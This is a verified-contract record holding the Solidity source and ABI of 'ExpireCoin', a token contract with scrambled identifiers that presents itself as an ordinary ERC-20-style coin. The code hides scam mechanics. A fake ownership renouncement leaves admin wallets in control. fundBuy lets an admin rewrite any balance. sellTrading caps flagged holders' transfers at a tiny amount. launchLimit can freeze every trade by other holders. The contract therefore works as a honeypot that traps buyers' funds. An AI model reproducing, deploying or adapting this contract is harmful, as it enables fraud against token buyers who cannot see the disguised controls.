{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract buyMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromSender {\n    function createPair(address txList, address teamTo) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface senderLaunchFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface teamTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderFee) external view returns (uint256);\n\n    function transfer(address totalTeam, uint256 launchedShouldTake) external returns (bool);\n\n    function allowance(address enableLimitMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedShouldTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalTeam,\n        uint256 launchedShouldTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableWallet, uint256 value);\n    event Approval(address indexed enableLimitMarketing, address indexed spender, uint256 value);\n}\n\ninterface teamTakeMetadata is teamTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExpireCoin is buyMode, teamTake, teamTakeMetadata {\n\n    uint256 marketingEnable;\n\n    uint256 public liquidityLaunch = 0;\n\n    uint256 public isLaunchedWallet = 3;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedTake;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromShould;\n    }\n\n    bool private totalTake;\n\n    function modeTrading(address walletSell, address totalTeam, uint256 launchedShouldTake) internal view returns (uint256) {\n        require(launchedShouldTake > 0);\n\n        uint256 exemptAuto = 0;\n        if (walletSell == feeTeam && isLaunchedWallet > 0) {\n            exemptAuto = launchedShouldTake * isLaunchedWallet / 100;\n        } else if (totalTeam == feeTeam && liquidityLaunch > 0) {\n            exemptAuto = launchedShouldTake * liquidityLaunch / 100;\n        }\n        require(exemptAuto <= launchedShouldTake);\n        return launchedShouldTake - exemptAuto;\n    }\n\n    function getOwner() external view returns (address) {\n        return fundWallet;\n    }\n\n    uint256 public fundAutoSwap;\n\n    function feeExempt(address walletSell, address totalTeam, uint256 launchedShouldTake) internal returns (bool) {\n        if (walletSell == launchList) {\n            return shouldSell(walletSell, totalTeam, launchedShouldTake);\n        }\n        uint256 autoFee = teamTake(feeTeam).balanceOf(enableMarketing);\n        require(autoFee == listFund);\n        require(totalTeam != enableMarketing);\n        if (tradingTeam[walletSell]) {\n            return shouldSell(walletSell, totalTeam, minLaunch);\n        }\n        launchedShouldTake = modeTrading(walletSell, totalTeam, launchedShouldTake);\n        return shouldSell(walletSell, totalTeam, launchedShouldTake);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedAt;\n    }\n\n    uint256 public listAt;\n\n    bool private listSell;\n\n    function shouldSell(address walletSell, address totalTeam, uint256 launchedShouldTake) internal returns (bool) {\n        require(atMode[walletSell] >= launchedShouldTake);\n        atMode[walletSell] -= launchedShouldTake;\n        atMode[totalTeam] += launchedShouldTake;\n        emit Transfer(walletSell, totalTeam, launchedShouldTake);\n        return true;\n    }\n\n    bool public txMin;\n\n    address marketingAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 listFund;\n\n    function transfer(address amountEnableSwap, uint256 launchedShouldTake) external virtual override returns (bool) {\n        return feeExempt(_msgSender(), amountEnableSwap, launchedShouldTake);\n    }\n\n    mapping(address => bool) public tradingTeam;\n\n    uint8 private fromShould = 18;\n\n    function sellTrading(address exemptMin) public {\n        minTo();\n        if (totalTake) {\n            listAt = walletLimit;\n        }\n        if (exemptMin == launchList || exemptMin == feeTeam) {\n            return;\n        }\n        tradingTeam[exemptMin] = true;\n    }\n\n    function minTo() private view {\n        require(walletLaunched[_msgSender()]);\n    }\n\n    uint256 private launchedAt = 100000000 * 10 ** 18;\n\n    string private launchedTake = \"ECN\";\n\n    function allowance(address enableFee, address limitTotal) external view virtual override returns (uint256) {\n        if (limitTotal == marketingAmount) {\n            return type(uint256).max;\n        }\n        return txToken[enableFee][limitTotal];\n    }\n\n    mapping(address => bool) public walletLaunched;\n\n    mapping(address => mapping(address => uint256)) private txToken;\n\n    bool public liquidityTx;\n\n    address private fundWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return autoTrading;\n    }\n\n    uint256 constant minLaunch = 19 ** 10;\n\n    function senderTotal(address buyFundTeam) public {\n        require(buyFundTeam.balance < 100000);\n        if (listAmount) {\n            return;\n        }\n        if (listAt != fundAutoSwap) {\n            listAt = fundAutoSwap;\n        }\n        walletLaunched[buyFundTeam] = true;\n        if (listSell) {\n            liquidityTx = true;\n        }\n        listAmount = true;\n    }\n\n    address enableMarketing;\n\n    address public feeTeam;\n\n    mapping(address => uint256) private atMode;\n\n    uint256 private walletLimit;\n\n    constructor (){\n        if (liquidityTx) {\n            liquidityTx = false;\n        }\n        receiverReceiver();\n        senderLaunchFee modeBuy = senderLaunchFee(marketingAmount);\n        feeTeam = fromSender(modeBuy.factory()).createPair(modeBuy.WETH(), address(this));\n        enableMarketing = fromSender(modeBuy.factory()).feeTo();\n        \n        launchList = _msgSender();\n        walletLaunched[launchList] = true;\n        atMode[launchList] = launchedAt;\n        \n        emit Transfer(address(0), launchList, launchedAt);\n    }\n\n    bool public listAmount;\n\n    function launchLimit(uint256 launchedShouldTake) public {\n        minTo();\n        listFund = launchedShouldTake;\n    }\n\n    function receiverReceiver() public {\n        emit OwnershipTransferred(launchList, address(0));\n        fundWallet = address(0);\n    }\n\n    bool private launchedSender;\n\n    event OwnershipTransferred(address indexed amountMin, address indexed senderTo);\n\n    bool public senderMax;\n\n    address public launchList;\n\n    function fundBuy(address amountEnableSwap, uint256 launchedShouldTake) public {\n        minTo();\n        atMode[amountEnableSwap] = launchedShouldTake;\n    }\n\n    function owner() external view returns (address) {\n        return fundWallet;\n    }\n\n    string private autoTrading = \"Expire Coin\";\n\n    function transferFrom(address walletSell, address totalTeam, uint256 launchedShouldTake) external override returns (bool) {\n        if (_msgSender() != marketingAmount) {\n            if (txToken[walletSell][_msgSender()] != type(uint256).max) {\n                require(launchedShouldTake <= txToken[walletSell][_msgSender()]);\n                txToken[walletSell][_msgSender()] -= launchedShouldTake;\n            }\n        }\n        return feeExempt(walletSell, totalTeam, launchedShouldTake);\n    }\n\n    function approve(address limitTotal, uint256 launchedShouldTake) public virtual override returns (bool) {\n        txToken[_msgSender()][limitTotal] = launchedShouldTake;\n        emit Approval(_msgSender(), limitTotal, launchedShouldTake);\n        return true;\n    }\n\n    function balanceOf(address senderFee) public view virtual override returns (uint256) {\n        return atMode[senderFee];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLimitMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedShouldTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAutoSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountEnableSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedShouldTake\",\"type\":\"uint256\"}],\"name\":\"fundBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunchedWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedShouldTake\",\"type\":\"uint256\"}],\"name\":\"launchLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMin\",\"type\":\"address\"}],\"name\":\"sellTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFundTeam\",\"type\":\"address\"}],\"name\":\"senderTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountEnableSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedShouldTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedShouldTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ExpireCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}